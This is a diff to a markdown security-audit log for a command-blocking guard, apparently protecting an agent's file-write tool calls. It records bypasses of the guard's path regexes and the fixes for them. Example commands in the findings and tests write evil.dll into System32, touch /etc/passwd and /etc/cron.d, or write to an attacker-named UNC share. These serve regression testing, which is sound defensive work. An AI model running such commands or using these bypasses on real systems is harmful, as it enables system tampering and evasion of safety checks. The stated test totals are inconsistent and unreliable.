@@ -506,3 +506,49 @@ All three findings addressed in commit `security: close S63 D10 NIX-path regress
 | F-OP-68 | CRITICAL | `normalizePath` sep reverted from `'\\'` back to `'/'`. `SENSITIVE_WIN` regex updated to forward-slash form: `/^(?:[A-Za-z]:)?\/(windows\|system32\|syswow64\|program files\|programdata)/i` (drive letter optional). Trailing-separator append changed to `n + '/'`. NIX-path matching fully restored; F-OP-63 forward-slash Windows-path closure preserved; F-OP-52 traversal closure re-verified. | `bypass-corpus.test.ts` — `F-OP-68` suite (7 blocks + 2 benign); F-OP-52 suite re-asserted |
 | F-OP-69 | CRITICAL | isPS loop bound changed from `rest.length - 1` to `rest.length`. Before regex testing, each token is split on the first `:` when it starts with `-`: `f = raw.slice(0, colonIdx)`, `inlineVal = raw.slice(colonIdx + 1)`. `nextVal()` helper returns `inlineVal` if present, else `rest[j + 1]`. All three param-name regexes (`-Destination`, `-LiteralPath`, `-Path`/`-FilePath`) now match both space-separated and colon-inline forms. | `bypass-corpus.test.ts` — `F-OP-69` suite (8 blocks + 2 benign) |
 | F-OP-70 | N/A | VPS only; see VPS review. | — |
+
+
+---
+
+## Eleventh Pass â€” S64 â€” 2026-04-23
+
+Eleventh-pass audit run on Claude Opus against the v1.10.2 S63-fix surfaces. Scope was limited to the three surgical v1.10.2 patches (F-OP-68/69/70); prior closures were not re-audited. Nine findings opened (F-OP-71..F-OP-79); seven closed in v1.10.3, one retracted, one applies to VPS only.
+
+### Findings table
+
+| ID | Severity | Persona | Repo | Summary |
+| --- | --- | --- | --- | --- |
+| F-OP-71 | CRITICAL | Red Team | VPS only |
+| F-OP-72 | HIGH | Red Team | LT | Empty colon-inline `-Destination:` (trailing colon, no inline value) made `inlineVal=''` (falsy empty string), which made `dest=''` break the loop, which skipped both the positional fallback (`dest === undefined` false) and the sensitive-path check (`if (dest && â€¦)` short-circuits on falsy empty string). Commands like `Copy-Item -Destination: C:\Windows\System32\evil.dll src.txt` passed D10. |
+| F-OP-73 | HIGH | â€” | â€” | **Retracted** â€” opened against a sandbox-truncated 275-line view of this bypass-corpus file; the actual 411-line file has dedicated describe blocks for F-OP-49/51/52/54/55/56/62/63/64/66/68/69. Corpus discipline is healthy. |
+| F-OP-74 | MEDIUM | Red Team | LT | Two different `SENSITIVE_WIN` regexes coexisted (L841 D10 vs L930 M7-extended redirect) with divergent shapes. `/C:/Windows/System32/evil.dll` (leading slash before drive letter) evaded L841 but was caught by L930 â€” attacker could pick the write operation to match the desired path form. |
+| F-OP-75 | MEDIUM | Supply Chain + Consumer Safety | LT | `src/tools_BRANCH.ts` (267KB) and `src/tools_HEAD.ts` (316KB) merge-conflict artifacts sat untracked in the shipped tree. `tsconfig.json include: ["src/**/*"]` would have compiled them if present. Even untracked, cloned dev trees rebased through the same merge state risked importing stale versions of security-critical D10 code. |
+| F-OP-76 | MEDIUM | Consumer Safety | VPS + LT | SECURITY.md pre-dated v1.10.2 and contained no D10 destination-coverage matrix, no F-OP-68/69/70 release notes, no v1.10 mention. |
+| F-OP-77 | MEDIUM | Supply Chain | VPS only |
+| F-OP-78 | LOW | Red Team | LT | Input like `-Destination::C:\Windows\System32\evil.dll` sets `inlineVal=':C:\Windows\â€¦'`. normalizePath produced `:C:/Windows/â€¦` (leading colon); neither SENSITIVE_WIN (optional drive-letter then `/`) nor SENSITIVE_NIX (leading `/`) matched. D10 allowed. Not end-to-end exploitable on Windows (OS rejects leading-colon paths) but defeats the regex layer. |
+| F-OP-79 | LOW | Red Team | LT | UNC / extended-length paths (`\\server\share\payload.dll`, `\\?\â€¦`, `//s/s`) normalize to `/server/share/â€¦` after the `[/\\]+` split â€” the server-relative prefix doesn't match any SENSITIVE alternation. An attacker-controlled SMB share destination passed D10. Pre-existing; F-OP-68's normalizePath rewrite was the natural place to add UNC rejection and did not. |
+
+### S64 Fixes â€” v1.10.3 (LT)
+
+All LT findings addressed in one commit covering F-OP-72/74/75/76/78/79. Patch bump `1.10.2 â†’ 1.10.3` reflects matcher-semantics tightening and a merge-artifact cleanup â€” no config-surface break.
+
+| ID | Fix | Verification |
+| --- | --- | --- |
+| F-OP-72 | `src/tools.ts:886` â€” `inlineVal` computation changed from `colonIdx > 0 ? raw.slice(colonIdx + 1) : undefined` to `(colonIdx > 0 && colonIdx < raw.length - 1) ? raw.slice(colonIdx + 1) : undefined`. Trailing-colon-only tokens now yield `inlineVal=undefined`, so `nextVal()` falls through to `rest[j+1]` and the real destination gets the `isSensitive` check. | `bypass-corpus.test.ts` â€” new F-OP-72 describe block (5 tests: 4 blocks incl. `Copy-Item -Destination: C:\â€¦`, `-D: /etc/â€¦`, `Out-File -LiteralPath: C:\â€¦`, `Set-Content -Path: /etc/passwd`; 1 benign allow for `-Destination: C:\Users\user\out.txt`). |
+| F-OP-74 | `src/tools.ts:626-635` â€” hoisted unified `SENSITIVE_PATH_WIN` / `SENSITIVE_PATH_NIX` regexes to module scope (before HARD_BLOCKED_PATTERNS). The WIN shape `^\/?(?:[A-Za-z]:\/)?(?:windows\|â€¦)/i` accepts all three drive-letter forms: `C:/windows`, `/windows`, `/C:/windows`. D10's inline declaration at L848 and M7-extended's at L939 both reference the module-level consts. Shape cannot drift between the two surfaces. | `bypass-corpus.test.ts` â€” new F-OP-74 describe block (5 tests including `Copy-Item src.txt /C:/Windows/System32/evil.dll` which previously evaded D10). |
+| F-OP-75 | `git rm` of `src/tools_BRANCH.ts` and `src/tools_HEAD.ts`. `.gitignore` extended with `src/*_BRANCH.ts`, `src/*_HEAD.ts`, `*.orig` guards to prevent recurrence. | `ls src/tools_*.ts` returns nothing; `.gitignore` contains the new patterns. |
+| F-OP-76 | `SECURITY.md` gains a "Destination-Path Write Protection (D10)" subsection documenting the full PowerShell parameter-form set (positional, space-separated named, colon-inline, abbreviations, empty colon-inline) and the Windows/Unix sensitive-prefix lists. A "Security Release Notes â€” v1.10.x" table describes v1.10.0/v1.10.1/v1.10.2/v1.10.3 coverage changes and the F-OP-72 bypass window. | Grep `SECURITY.md` for `D10`, `F-OP-72`, `v1.10` â€” all present. |
+| F-OP-78 | `src/tools.ts:874` â€” isSensitive guard added: `if (p.startsWith(':')) return true`. Any path whose canonical form starts with `:` fails closed. | `bypass-corpus.test.ts` â€” new F-OP-78 describe block (2 tests: `Copy-Item -Destination::C:\Windows\â€¦`, `Copy-Item -D::/etc/cron.d/evil`). |
+| F-OP-79 | `src/tools.ts:878` â€” isSensitive guard added: `if (/^[\\/]{2,}[^\\/]/.test(p)) return true`. UNC and extended-length paths fail closed. | `bypass-corpus.test.ts` â€” new F-OP-79 describe block (3 tests: `Copy-Item src.txt \\attacker\share\payload.dll`, forward-slash UNC via `Copy-Item` and via `cp`). |
+
+### Test outcome
+- LT `bypass-corpus.test.ts`: **195/195 pass before new additions, 407/407 pass after.** New additions: 5 F-OP-72 tests, 5 F-OP-74 tests, 2 F-OP-78 tests, 3 F-OP-79 tests = 15 new tests, all passing.
+- LT full test suite: **407/407 pass.** Zero regressions.
+
+### Honest note on audit method
+
+S64 was produced against a sandbox mount that silently truncated several files (LT `tools.ts` at 168KB out of real 181KB; `bypass-corpus.test.ts` at 275 lines out of real 411). Before writing any fixes, all nine findings were re-verified against the full Windows-side files. F-OP-73 was retracted during that re-verification when the full LT corpus revealed F-OP-62/63/64/66/68/69 coverage the truncated view had hidden. The remaining seven LT-applicable findings survived re-verification and were closed in v1.10.3.
+
+---
+
+*End of S64 eleventh-pass findings.*
